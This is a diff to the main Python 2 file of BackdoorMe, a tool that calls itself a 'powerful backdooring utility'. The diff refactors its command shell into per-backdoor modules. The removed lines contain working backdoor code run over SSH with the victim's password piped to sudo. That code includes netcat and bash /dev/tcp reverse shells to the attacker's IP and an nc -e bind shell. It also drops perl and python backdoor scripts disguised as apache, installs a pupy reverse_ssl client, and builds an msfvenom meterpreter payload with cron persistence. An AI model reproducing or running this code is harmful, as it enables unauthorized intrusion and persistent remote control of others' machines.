@@ -6,11 +6,16 @@ from colorama import *
 from Tkinter import *
 import cmd
 from start import ascii
+from imports import *
 
 GOOD = Fore.GREEN + " + " + Fore.RESET
 BAD = Fore.RED + " - " + Fore.RESET
 WARN = Fore.YELLOW + " * " + Fore.RESET
 INFO = Fore.BLUE + " + " + Fore.RESET
+
+def fmtcols(mylist, cols):
+    lines = ("\t".join(mylist[i:i+cols]) for i in xrange(0,len(mylist),cols))
+    return '\n'.join(lines)
 
 class BackdoorMe(cmd.Cmd):
     prompt = Fore.BLUE + ">> " + Fore.RESET
@@ -19,17 +24,23 @@ class BackdoorMe(cmd.Cmd):
         cmd.Cmd.__init__(self) 
         
         self.target_num = 1
-        self.port = 22; #change this if the port is different, almost never necessary
+        self.port = 22 
         self.targets = {}
         self.curtarget = None
         proc = subprocess.Popen(["ifconfig | grep inet | head -n1 | cut -d\  -f12 | cut -d: -f2"], stdout=subprocess.PIPE, shell=True)
         self.localIP = proc.stdout.read()
         self.localIP = self.localIP[:-1]
         ascii()
-        print "Welcome to BackdoorMe, a backdooring utility. Type \"help\" to see the list of available commands."
+        print "Welcome to BackdoorMe, a powerful backdooring utility. Type \"help\" to see the list of available commands."
         print "Type \"addtarget\" to set a target, and \"open\" to open an SSH connection to that target."
         print "Using local IP of %s." % self.localIP
-        
+    
+    def do_help(self, args):
+        print "Type \"addtarget\" to set a target, and \"open\" to open an SSH connection to that target."
+        print "Using local IP of %s." % self.localIP
+        print "\nAvailable commands are: "
+        print fmtcols(["addtarget", "adds a target", "edit target", "edit existing target"], 2)
+
     def do_addtarget(self, args):
         hostname = raw_input('Target Hostname: ') #victim host
         try:
@@ -71,6 +82,15 @@ class BackdoorMe(cmd.Cmd):
             self.curtarget = self.targets[int(args[0])]
             print GOOD + "Current target set to %s" % args[0]
     
+    def open_conn(self,t):
+        try: 
+            t.conn()
+        except:
+            print BAD + "Connection failed."
+            return
+        print GOOD + "Connection established."
+
+
     def do_open(self, args):
         t = self.get_target(args)
         if t == None:
@@ -81,7 +101,7 @@ class BackdoorMe(cmd.Cmd):
             print BAD + "Connection failed."
             return
         print GOOD + "Connection established."
-
+    
     def do_close(self, args):
         t = self.get_target(args)
         if t == None:
@@ -108,6 +128,10 @@ class BackdoorMe(cmd.Cmd):
         else:
             print GOOD + "Using target %s" % args[0]
             t = self.targets[int(args[0])]
+        if not t.is_open:
+            print BAD + "No SSH connection to target. Attempting to open a connection..."
+            self.open_conn(t)
+  
         return t
 
     def target_exists(self, num):
@@ -117,148 +141,44 @@ class BackdoorMe(cmd.Cmd):
         t = self.get_target(args)
         if t == None:
             return
-        if not t.is_open:
-            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
-            return
-        raw_input("Please enter the following command: nc -v -n -l -p 53920")
-        print("Initializing backdoor...")
-        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S rm /tmp/f;")
-        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S mkfifo /tmp/f;")
-        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup cat /tmp/f | nohup /bin/bash -i 2>&1 | nohup nc " + self.localIP + " 53920 > sudo nohup /tmp/f &")
-        print(GOOD + "Netcat backdoor on port 53920 attempted.")
+        Netcat(t, self).cmdloop()
 
     def do_nce(self, args):
         t = self.get_target(args)
         if t == None:
                 return
-        if not t.is_open:
-            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
-            return
-	print("Shipping netcat-traditional package.")
-	self.curtarget.scpFiles(self, '/bin/nc.traditional', False)
-        print("Initializing backdoor on port 53926...")
-	self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup ./nc.traditional -l -p 53926 -e /bin/bash")
-	print(GOOD + "Backdoor attempted. Use nc " + self.curtarget.hostname + " 53926.")
+        Netcat_Traditional(t, self).cmdloop()
 
     def do_perl(self,args):
         t = self.get_target(args)
         if t == None:
             return
-
-        if not t.is_open:
-            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
-            return
-
-        toW = 'perl/prsA.pl'
-        stringToAdd = ""
-        fileToWrite = open(toW, 'w')
-
-        with open ("perl/prs1", "r") as myfile:
-            data=myfile.read()
-        data = data[:-1]#remove the last new line character.
-        stringToAdd+=data + self.localIP
-
-        with open ("perl/prs2", "r") as myfile:
-            data=myfile.read()
-        stringToAdd+=data
-        fileToWrite.write(stringToAdd)
-        fileToWrite.close()
-
-        raw_input("Run the following command: nc -v -n -l -p 53921 in another shell to start the listener.")
-        self.curtarget.scpFiles(self, 'perl/prsA.pl', False)
-        print("Moving the backdoor script.")
-        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup perl prsA.pl")
-        print("Perl backdoor on port 53921 attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop.")
-
-
+        Perl(t, self).cmdloop()
+        
     def do_bash(self, args):
         t = self.get_target(args)
         if t == None:
             return
-
-        if not t.is_open:
-            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
-            return
-
-        raw_input("Please enter the following command: nc -v -n -l -p 53923 in another shell to connect.")
-        print("Initializing backdoor...")
-        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.localIP + "/53923 0>&1")
-        print(GOOD + "Bash Backdoor on port 53923 attempted. You may need to input the password, which is " + t.pword)
-
+        Bash(t, self).cmdloop()
+       
     def do_pupy(self, args):
         t=self.get_target(args)
         if t == None:
             return
-        if not t.is_open:
-            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
-            return
-	    
-        self.curtarget.ssh.exec_command('rm -r pupy')
-        self.curtarget.scpFiles(self, 'pupy', True)
-        self.curtarget.scpFiles(self, '/usr/local/lib/python2.7/dist-packages/rpyc', True)
-        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S mv -f rpyc /usr/local/lib/python2.7/dist-packages")
-        raw_input("Please navigate to the pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
-        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S python pupy/client/reverse_ssl.py " + self.localIP + ":443")
-        raw_input(GOOD + "Backdoor attempted on target machine. To run a command, type sessions -i [id] and then 'exec <commandname>.")
+        Pupy(t, self).cmdloop() 
 
     def do_python(self, args):
         t = self.get_target(args)
         if t == None:
             return
-
-        if not t.is_open:
-            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
-            return
-
-        toW = 'pythScript/pythBackdoor.py'
-        stringToAdd = ""
-        fileToWrite = open(toW, 'w')
-
-        with open ("pythScript/pythPart1", "r") as myfile:
-            data=myfile.read()
-        data = data[:-1]#remove the last new line character.
-        stringToAdd+=data + self.localIP
-    
-        with open ("pythScript/pythPart2", "r") as myfile:
-            data=myfile.read()
-        stringToAdd+=data
-        fileToWrite.write(stringToAdd)
-        fileToWrite.close()
-        raw_input("Run the following command: nc -v -n -l -p 53922 in another shell.")
-        self.curtarget.ssh.exec_command('rm pythBackdoor.py')
-        self.curtarget.scpFiles(self, 'pythScript/pythBackdoor.py', False)
-        print("Moving the backdoor script.")
-        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup python pythBackdoor.py")
-        print(GOOD + "Python backdoor on 53922 attempted.")
-
-
+        Pyth(t, self).cmdloop()
+       
     def do_metasploit(self,args):
         t = self.get_target(args)
         if t == None:
             return
-        if not t.is_open:
-            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
-            return
-
-
-        cron = (raw_input(" + Press y to start backdoor as a cronjob (recommended): ") == 'y')
-        #os.system("msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp lhost=10.1.0.1 lport=4444 --platform=Linux -o initd -f elf -e x86/shikata_ga_nai") #% ip_address)
-        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=4444 -f elf X -o initd" % self.localIP)
-        self.curtarget.scpFiles(self, 'initd', False)
-        print("Backdoor script moved")
-        self.curtarget.ssh.exec_command("chmod +x initd")
-        if cron:
-            self.curtarget.ssh.exec_command("crontab -l > mycron")
-            self.curtarget.ssh.exec_command("echo \"* * * * * ./initd\" >> mycron && crontab mycron && rm mycron")
-        print(GOOD + "Backdoor attempted on port 4444. Backdoor will attempt to reconnect every second, and will stop attempting once connection is made. To access, open msfconsole and run:")
-        print("use multi/handler\n \
-        > set PAYLOAD linux/x86/meterpreter/reverse_tcp\n \
-        > set LHOST %s\n \
-        > exploit", self.localIP)
-        raw_input(GOOD + "Press any key to launch exploit once msfconsole is listening...")
-        self.curtarget.ssh.exec_command("watch -n1 nohup ./initd > /dev/null &")
-
-
+        Metasploit(t, self).cmdloop()
+    
     def do_passwd(self, args):
         t = self.get_target(args)
         if t == None:
@@ -313,9 +233,6 @@ class BackdoorMe(cmd.Cmd):
             print "%s - %s %s:%s" % (num, t.hostname, t.uname, t.pword)
 
     def preloop(self):
-        """Initialization before prompting user for commands.
-           Despite the claims in the Cmd documentaion, Cmd.preloop() is not a stub.
-        """
         cmd.Cmd.preloop(self)   ## sets up command completion
         self._hist    = []      ## No history yet
         self._locals  = {}      ## Initialize execution namespace for user
